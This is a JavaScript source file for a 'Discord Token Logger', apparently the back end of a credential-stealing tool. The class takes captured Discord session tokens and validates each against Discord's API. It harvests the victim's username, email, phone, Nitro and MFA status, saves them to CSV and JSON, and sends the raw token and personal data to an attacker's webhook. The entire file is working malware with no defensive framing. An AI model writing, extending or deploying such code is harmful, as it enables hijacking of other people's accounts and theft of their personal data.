const fs = require('fs');
const path = require('path');
const axios = require('axios');
const createCsvWriter = require('csv-writer').createObjectCsvWriter;

class DiscordTokenLogger {
  constructor() {
    this.tokensDir = path.join(__dirname, 'tokens');
    this.csvPath = path.join(this.tokensDir, 'discord_tokens.csv');
    this.jsonPath = path.join(this.tokensDir, 'discord_tokens.json');
    
    // Ensure tokens directory exists
    if (!fs.existsSync(this.tokensDir)) {
      fs.mkdirSync(this.tokensDir, { recursive: true });
    }
    
    // Initialize CSV writer
    this.csvWriter = createCsvWriter({
      path: this.csvPath,
      header: [
        { id: 'timestamp', title: 'Timestamp' },
        { id: 'token', title: 'Token' },
        { id: 'username', title: 'Username' },
        { id: 'userId', title: 'User ID' },
        { id: 'email', title: 'Email' },
        { id: 'phone', title: 'Phone' },
        { id: 'avatar', title: 'Avatar' },
        { id: 'nitro', title: 'Nitro Type' },
        { id: 'mfa', title: 'MFA Enabled' },
        { id: 'url', title: 'Capture URL' }
      ],
      append: true
    });
  }

  async processToken(tokenData) {
    try {
      const { token, url, timestamp } = tokenData;
      
      if (!token) {
        throw new Error('No token provided');
      }

      console.log('Processing Discord token:', token.substring(0, 20) + '...');

      // Get user information from Discord API
      const userInfo = await this.getUserInfo(token);
      
      if (!userInfo) {
        throw new Error('Failed to fetch user information');
      }

      // Create token record
      const tokenRecord = {
        timestamp: timestamp || new Date().toISOString(),
        token: token,
        username: `${userInfo.username}#${userInfo.discriminator}`,
        userId: userInfo.id,
        email: userInfo.email || 'N/A',
        phone: userInfo.phone || 'N/A',
        avatar: userInfo.avatar || 'N/A',
        nitro: this.getNitroType(userInfo.premium_type),
        mfa: userInfo.mfa_enabled || false,
        url: url || 'N/A'
      };

      // Save to CSV
      await this.saveToCSV(tokenRecord);
      
      // Save to JSON
      await this.saveToJSON(tokenRecord);
      
      // Send to Discord webhook if configured
      await this.sendToWebhook(tokenRecord);

      console.log('✅ Token processed successfully:', tokenRecord.username);
      
      return {
        success: true,
        message: 'Token processed successfully',
        userInfo: tokenRecord
      };

    } catch (error) {
      console.error('❌ Error processing token:', error.message);
      return {
        success: false,
        message: error.message,
        error: error.toString()
      };
    }
  }

  async getUserInfo(token) {
    try {
      const response = await axios.get('https://discord.com/api/v9/users/@me', {
        headers: {
          'Authorization': token,
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
          'Accept': '*/*',
          'Accept-Language': 'en-US,en;q=0.9',
          'Referer': 'https://discord.com/channels/@me',
          'DNT': '1'
        },
        timeout: 10000
      });

      return response.data;
    } catch (error) {
      console.error('Failed to fetch user info:', error.response?.status, error.response?.statusText);
      return null;
    }
  }

  getNitroType(premiumType) {
    const nitroTypes = {
      0: 'None',
      1: 'Nitro Classic',
      2: 'Nitro',
      3: 'Nitro Basic'
    };
    return nitroTypes[premiumType] || 'Unknown';
  }

  async saveToCSV(tokenRecord) {
    try {
      // Check if CSV file exists, if not create header
      if (!fs.existsSync(this.csvPath)) {
        await this.csvWriter.writeRecords([]);
      }
      
      await this.csvWriter.writeRecords([tokenRecord]);
      console.log('✅ Token saved to CSV:', this.csvPath);
    } catch (error) {
      console.error('❌ Error saving to CSV:', error);
    }
  }

  async saveToJSON(tokenRecord) {
    try {
      let tokens = [];
      
      // Read existing tokens
      if (fs.existsSync(this.jsonPath)) {
        const data = fs.readFileSync(this.jsonPath, 'utf8');
        tokens = JSON.parse(data);
      }
      
      // Add new token (avoid duplicates)
      const existingIndex = tokens.findIndex(t => t.token === tokenRecord.token);
      if (existingIndex >= 0) {
        tokens[existingIndex] = tokenRecord; // Update existing
      } else {
        tokens.push(tokenRecord); // Add new
      }
      
      // Save back to file
      fs.writeFileSync(this.jsonPath, JSON.stringify(tokens, null, 2));
      console.log('✅ Token saved to JSON:', this.jsonPath);
    } catch (error) {
      console.error('❌ Error saving to JSON:', error);
    }
  }

  async sendToWebhook(tokenRecord) {
    try {
      const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
      
      if (!webhookUrl) {
        console.log('⚠️ No webhook URL configured, skipping webhook');
        return;
      }

      const embed = {
        embeds: [{
          title: `🔑 Discord Token Captured`,
          color: 0x5865F2,
          fields: [
            {
              name: '👤 User',
              value: `**${tokenRecord.username}**\nID: ${tokenRecord.userId}`,
              inline: true
            },
            {
              name: '🔑 Token',
              value: `\`\`\`${tokenRecord.token}\`\`\``,
              inline: false
            },
            {
              name: '📧 Email',
              value: tokenRecord.email,
              inline: true
            },
            {
              name: '📱 Phone',
              value: tokenRecord.phone,
              inline: true
            },
            {
              name: '💎 Nitro',
              value: tokenRecord.nitro,
              inline: true
            },
            {
              name: '🛡️ MFA',
              value: tokenRecord.mfa ? 'Enabled' : 'Disabled',
              inline: true
            },
            {
              name: '🌐 Captured From',
              value: tokenRecord.url,
              inline: false
            }
          ],
          thumbnail: {
            url: tokenRecord.avatar !== 'N/A' 
              ? `https://cdn.discordapp.com/avatars/${tokenRecord.userId}/${tokenRecord.avatar}.png`
              : 'https://cdn.discordapp.com/embed/avatars/0.png'
          },
          timestamp: tokenRecord.timestamp,
          footer: {
            text: 'Discord Token Logger - Node.js'
          }
        }]
      };

      await axios.post(webhookUrl, embed, {
        headers: { 'Content-Type': 'application/json' },
        timeout: 10000
      });

      console.log('✅ Token sent to Discord webhook');
    } catch (error) {
      console.error('❌ Error sending to webhook:', error.message);
    }
  }

  getStoredTokens() {
    try {
      if (fs.existsSync(this.jsonPath)) {
        const data = fs.readFileSync(this.jsonPath, 'utf8');
        return JSON.parse(data);
      }
      return [];
    } catch (error) {
      console.error('Error reading stored tokens:', error);
      return [];
    }
  }

  getTokenStats() {
    try {
      const tokens = this.getStoredTokens();
      const csvExists = fs.existsSync(this.csvPath);
      const csvStats = csvExists ? fs.statSync(this.csvPath) : null;

      return {
        totalTokens: tokens.length,
        uniqueUsers: new Set(tokens.map(t => t.userId)).size,
        csvExists: csvExists,
        csvPath: this.csvPath,
        jsonPath: this.jsonPath,
        lastModified: csvStats ? csvStats.mtime : null,
        recentTokens: tokens.slice(-5).reverse() // Last 5 tokens
      };
    } catch (error) {
      console.error('Error getting token stats:', error);
      return {
        totalTokens: 0,
        uniqueUsers: 0,
        csvExists: false,
        error: error.message
      };
    }
  }
}

module.exports = DiscordTokenLogger;
